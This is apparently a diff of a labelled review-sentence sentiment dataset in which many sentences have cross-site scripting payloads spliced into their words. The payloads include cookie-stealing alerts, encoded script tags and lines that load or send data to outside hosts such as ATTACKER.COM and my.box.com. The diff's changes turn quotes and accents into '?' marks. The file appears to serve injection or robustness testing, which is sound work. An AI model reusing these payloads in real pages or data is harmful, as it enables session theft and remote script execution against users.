@@ -140,7 +140,7 @@ label	sentence
 0	The acting sucked.
 0	I think the most wonderful parts (literally, full of "wonder") are the excerpts from his works.
 1	I only used it two <script/src=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script>days, and it wasn't always easy to hear with.
-0	I wasn't expect1	The nano stat%253cscript%253ealert(document.cookie)%253c/script%253e“><<script>alert(document.cookie);//<</script>ed it.My son was dissapointed.
+0	I wasn't expect1	The nano stat%253cscript%253ealert(document.cookie)%253c/script%253e?><<script>alert(document.cookie);//<</script>ed it.My son was dissapointed.
 1	If there is a wind, it is completely us<SVG/ONLOAD="(NEW IMAGE()).SRC='//ATTACKER.COM/'%2BDOCUMENT.DOCUMENTELEMENT.INNERHTML">eless.
 1	They keep getting better and better (this is my third one and I've had nu&LT;LAYER SRC=\"HTTP&#58;//HA&#46;CKERS&#46;ORG/SCRIPTLET&#46;HTML\"&GT;&LT;/LAYER&GT;merous Palms too).
 0	It ranks highly as a great noir-crime-drama, incredible performances by Belmondo and Lino Ventura.
@@ -185,7 +185,7 @@ label	sentence
 1	I am sorry <OBJECT DATA="HTTP://CORKAMI.GOOGLECODE.COM/SVN/!SVN/BC/480/TRUNK/MISC/PDF/HELLOWORLD_JS_X.PDF">I made this purchase.
 0	I came out of it feeling angry.
 1	Terribl<DIV STYLE="WIDTH: EXPRESSION(ALERT('XSS'));">e phone holder.
-1	While I managed to bend the leaf spring back in place, the metal now has enough stress that it w‘; ALERT(DOCUMENT.COOKIE); VAR FOO=’ill break on the next drop.
+1	While I managed to bend the leaf spring back in place, the metal now has enough stress that it w?; ALERT(DOCUMENT.COOKIE); VAR FOO=?ill break on the next drop.
 0	Barney is definitely super DE duper.
 1	I am very happ</script><img/*%00/src="worksinchrome&colon;prompt&#x28;1&#x29;"/%00*/onerror='eval(src)'>y
 0	One more thing: I can tolerate political incorrectness very well, I'm all for artistic freedom and suspension of disbelief, but the Slavic female character was just too much.
@@ -251,7 +251,7 @@ label	sentence
 1	So just be<iframe/src=javascript:alert(1)>ware.
 1	Performed awful -- muffled, tinny incoming sound and severe echo for those on the other end of t<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">he call.
 0	Everything about this movie is stupid.
-1	I love the look and fefoo\’; alert(document.cookie);//’;el of Samsung flipphones.
+1	I love the look and fefoo\?; alert(document.cookie);//?;el of Samsung flipphones.
 1	Ba<svg xmlns="#"><script>alert(1)</script></svg>ttery is terrible.
 1	Poor quality.<input onfocus=write(xss) autofocus>
 0	He owns the film, just as Spacek owned "Coal Miner's Daughter" and Quaid owned "Great Balls of Fire.
@@ -275,7 +275,7 @@ label	sentence
 1	Those phones are w<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>orking just fine now.
 0	The things that the four kids get themselves into is absolutely hilarious to watch.
 1	The first thing that happe<iframe/src="data:text/html;&tab;base64&tab;,pgjvzhkgb25sb2fkpwfszxj0kdeppg==">ned was that the tracking was off.
-1	Leopard PFOO\’; ALERT(DOCUMENT.COOKIE);//’;rint is wonderfully wild!.
+1	Leopard PFOO\?; ALERT(DOCUMENT.COOKIE);//?;rint is wonderfully wild!.
 1	A good quality bargain.. I bought this after "><SCRIPT SRC=DATA:TEXT/JAVASCRIPT;BASE64,ZD1KB2N1BWVUDDSGXYA9IGQUY3JLYXRLRWXLBWVUDCGNC2NYAXB0JYK7XY5PZD0NMTKNO18UBM9UY2U9ZC5XDWVYEVNLBGVJDG9YKCDBBM9UY2VDJYKUBM9UY2U7XY5ZCMM9JY8VBG9JYWXOB3N0L20NO2QUYM9KES5HCHBLBMRDAGLSZCHFKSA=></SCRIPT>I bought a cheapy from Big Lots that sounded awful and people on the other end couldn't hear me.
 1	AFter the fi<SCRIPT/&TAB; SRC='HTTPS://DL.DROPBOX.COM/U/13018058/JS.JS' /&TAB;></SCRIPT>rst charge kept going dead after 2 minutes.
 0	Rating:  out of .
@@ -299,7 +299,7 @@ label	sentence
 0	But what really made it unwatchable was the direction.
 0	There was a few pathetic attempts to give the characters some depth, but it didn't really work into the rest of the plot.
 0	Much more interesting, more action, more suspense, and less of the unneeded controversy.
-1	Would not rec%22/%3e%3cbody%20onload=’document.write(%22%3cs%22%2b%22cript%20src=http://my.box.com/xss.js%3e%3c/script%3e%22)’%3ecommend.
+1	Would not rec%22/%3e%3cbody%20onload=?document.write(%22%3cs%22%2b%22cript%20src=http://my.box.com/xss.js%3e%3c/script%3e%22)?%3ecommend.
 1	It feels poorly constructed, the menus are difficult to navigate, and the buttons are so recessed that it is difficult to push<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe> them.
 0	The plot - well, I said I'd let that one go.
 1	I &lt;DIV STYLE=\"background-image&#58;\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&gt;recommend iGo to anyone with different brand cell phones/mp3 players in the family.
@@ -313,9 +313,9 @@ label	sentence
 1	It has ev&lt;div style=\"background-image&#58; url(javascript&#058;alert('xss'))\"&gt;erything I need and I couldn't ask for more.
 1	Doesn't Wo&LT;DIV STYLE=\"BACKGROUND-IMAGE&#58; URL(JAVASCRIPT&#058;ALERT('XSS'))\"&GT;rk.
 1	Utter crap.. S+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-ound quality is TERRIBLE.
-1	So I bought about  of these and saved alot of m%253CSCRIPT%253EALERT(DOCUMENT.COOKIE)%253C/SCRIPT%253E“><<SCRIPT>ALERT(DOCUMENT.COOKIE);//<</SCRIPT>oney.
+1	So I bought about  of these and saved alot of m%253CSCRIPT%253EALERT(DOCUMENT.COOKIE)%253C/SCRIPT%253E?><<SCRIPT>ALERT(DOCUMENT.COOKIE);//<</SCRIPT>oney.
 0	The hockey scenes are terrible, defensemen playing like they're 5 years old, goalies diving at shots that are  feet wide of the net, etc.
-1	I'm happy‘; alert(document.cookie); var foo=’ about this purchase- good quality and low price.
+1	I'm happy?; alert(document.cookie); var foo=? about this purchase- good quality and low price.
 0	But the acting--even that of such professionals as Drago and Debbie Rochon--was terrible, the directing worse (perhaps contributory to the former), the dialog chimp-like, and the camera work, barely tolerable.
 1	This isjavascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'> a great phone!.
 1	Disapointing Re<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"sults.
@@ -405,7 +405,7 @@ label	sentence
 0	The soundtrack sucked.
 0	The character developments also lacked in depth.
 0	The flat reenactments don't hold your attention because they are emotionally adrift and stagy.
-1	They have been a‘; alert(document.cookie); var foo=’round for years and carries the highest quality of anti-glare screen protector that I have found to date.
+1	They have been a?; alert(document.cookie); var foo=?round for years and carries the highest quality of anti-glare screen protector that I have found to date.
 1	Bett<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable>drop here</xss>er Than New.
 0	Bela Lugosi was totally extraneous, intoning odd lines.
 0	The concert sequences just sucked.
@@ -460,7 +460,7 @@ label	sentence
 0	The new characters weren't all that memorable, and I found myself forgetting who was who.
 0	Elias Koteas,Jack Palance play good roles Angelina is hot and gets naked.Billy Drago appears in this and is cool as usual + a cameo by Sven ole Thorsen helps make this a very enjoyable movie with good acting and a decent budget.
 1	Problem is that the ear loops are made of weak<SVG XMLNS="#"><SCRIPT>ALERT(1)</SCRIPT></SVG> material and break easily.
-0	This show is made for Americans - it is too stupid and full with hatred and clichés to be admitted elsewhere.
+0	This show is made for Americans - it is too stupid and full with hatred and clich?s to be admitted elsewhere.
 1	It's v%2baciapga8-script%2bad4-alert%28document.location%29%2badw-%2fscript%2bad4apaai-ery convenient and simple to use - gets job done & makes the car ride so much smoother.
 1	I like design and look of Jabra behing the ear headsets and 52 is pretty comfortible<input onfocus=write(XSS) autofocus> to wear 24 hours a day without pain in the ear.
 0	Which has more depth and character than the man underneath it.
@@ -496,7 +496,7 @@ label	sentence
 0	All in all a beautiful directed film from Nicola's roeg wih a sublime cast.
 1	All the other cases I've tried normally fall apart after &lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;a few months but this one seems to be in for the long haul.
 0	The worst, sappiest dialogue... I could go on and on.
-1	Th%253cscript%253ealert(document.cookie)%253c/script%253e“><<script>alert(document.cookie);//<</script>e handsfree part works fine, but then the car tries to download the address book, and the Treo reboots.Overall, I still rate this device high.
+1	Th%253cscript%253ealert(document.cookie)%253c/script%253e?><<script>alert(document.cookie);//<</script>e handsfree part works fine, but then the car tries to download the address book, and the Treo reboots.Overall, I still rate this device high.
 1	I cou<input/onmouseover="javascript&colon;confirm&lpar;1&rpar;"ld not recommend these more.
 0	It features an outlandish array of memorable, psychotic but lovable nuts.
 0	I would have casted her in that role after ready the script.
@@ -522,15 +522,15 @@ label	sentence
 1	Batter<INPUT ONFOCUS=WRITE(XSS) AUTOFOCUS>y charge-life is quite long.
 0	Unfortunately, this is a bad movie that is just plain bad.
 0	I'm translating movies for a living and this is the first movie in my 5-year working experience that I found offensive to my intelligence.
-1	So I had to ta%22/%3E%3CBODY%20ONLOAD=’DOCUMENT.WRITE(%22%3CS%22%2B%22CRIPT%20SRC=HTTP://MY.BOX.COM/XSS.JS%3E%3C/SCRIPT%3E%22)’%3Eke the battery out of the phone put it all back together and then restart it.
+1	So I had to ta%22/%3E%3CBODY%20ONLOAD=?DOCUMENT.WRITE(%22%3CS%22%2B%22CRIPT%20SRC=HTTP://MY.BOX.COM/XSS.JS%3E%3C/SCRIPT%3E%22)?%3Eke the battery out of the phone put it all back together and then restart it.
 1	It works fine on my Motorola//<form/action=javascript&#x3a;alert&lpar;document&period;cookie&rpar;><input/type='submit'>// 325 cellphone, and a lot better than the worn-out battery did.
 1	if you simply want a small flip phone -- look elsewhere as the extra bells &lt;img dynsrc=\"javascript&#058;alert('xss')\"&gt;& whistles are mediocre.
 1	The camera on the phone may be used as a dustpan when indoors... I'd rather%2badw-script+ad4-alert(document.location)%2badw-/script%2bad4- be using a disposable then this.
-1	This does not %22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3Efit the Palm Tungsten E2 and it broke the first time I tried to plug it in.
+1	This does not %22/%3E%3CBODY%20onload=?document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)?%3Efit the Palm Tungsten E2 and it broke the first time I tried to plug it in.
 1	It felt too lig<scr<script>ipt>alert(document.cookie)</scr</script>ipt>ht and "tinny.".
 0	If you check the director's filmography on this site you will see why this film didn't have a chance.
 0	The ending is so, SO perfect... you'll shed a tear.
-1	Just what I wantefoo\’; alert(document.cookie);//’;d.
+1	Just what I wantefoo\?; alert(document.cookie);//?;d.
 0	The performances are real and gripping, the crocdodile is extremely well done, indeed if the Black Water website is to be believed that's because they used real crocs and the swamp location is fabulous.
 0	I am so pleased to know such a modern day genius is out there , letting is passion for Art drive him and taking us as an audience with him.
 0	I think it was Robert Ryans best film, because he portrayed someone like my father, and he was a schizophrenic in real life,(my father) although he never murdered anyone but was affected more so during the second world war which made him worse.
